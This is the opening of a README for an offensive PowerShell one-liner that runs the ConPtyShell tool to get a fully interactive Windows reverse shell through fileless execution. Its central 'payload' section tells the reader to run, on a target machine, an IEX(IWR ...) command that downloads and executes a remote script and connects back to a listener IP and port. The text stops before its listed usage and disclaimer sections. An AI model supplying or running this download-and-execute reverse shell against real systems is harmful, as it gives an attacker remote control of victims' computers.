# 🐚 ConPtyShell PowerShell One-Liner

<div align="center">

[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B%20%2F%20Core-blue.svg)](https://github.com/PowerShell/PowerShell)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![Type](https://img.shields.io/badge/Type-Interactive%20Pseudo%20Console%20(ConPTY)-red.svg)](https://github.com/antonioCoco/ConPtyShell)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

*An advanced, fully interactive Windows Pseudo Console (ConPTY) reverse shell runner leveraging fileless execution.*

</div>

---

## 📖 Table of Contents
- [Overview](#-overview)
- [The Payload](#-the-payload)
- [Technical Breakdown](#-technical-breakdown)
- [Features & Advantages](#-features--advantages)
- [Prerequisites](#-prerequisites)
- [Step-by-Step Usage Guide](#-step-by-step-usage-guide)
- [Troubleshooting](#-troubleshooting)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🚀 Overview

This repository documents and streamlines the usage of **ConPtyShell** (`Invoke-ConPtyShell.ps1`), originally developed by `antonioCoco`. 

Unlike traditional, legacy reverse shells (which often suffer from broken backspaces, lack of terminal resizing, and awkward command-history navigation), ConPtyShell spawns a native Windows Pseudo Console (`ConPTY`). This bridges the target's internal processes with your terminal handler, giving you a true, high-fidelity interactive shell experience.

---

## ⚡ The Payload

Copy and run the following command inside a PowerShell session on the target Windows system:

```powershell
IEX(IWR [https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell 192.168.178.118 33413
